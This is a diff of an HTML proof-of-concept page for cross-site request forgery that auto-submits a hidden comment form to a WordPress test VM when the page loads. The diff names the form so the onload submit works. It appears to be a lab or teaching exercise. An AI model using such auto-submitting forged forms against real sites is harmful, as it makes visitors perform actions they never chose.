@@ -1,7 +1,11 @@
 <html>
   <head></head>
   <body onload="document.csrfForm.submit()">
-    <form action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
+    <form
+      name="csrfForm"
+      action="http://wpdistillery.vm/wp-comments-post.php"
+      method="POST"
+    >
       <input type="hidden" name="comment" value="Oh no! I got fooled!" />
       <input type="hidden" name="comment_post_ID" value="11" />
       <input type="hidden" name="comment_parent" value="0" />
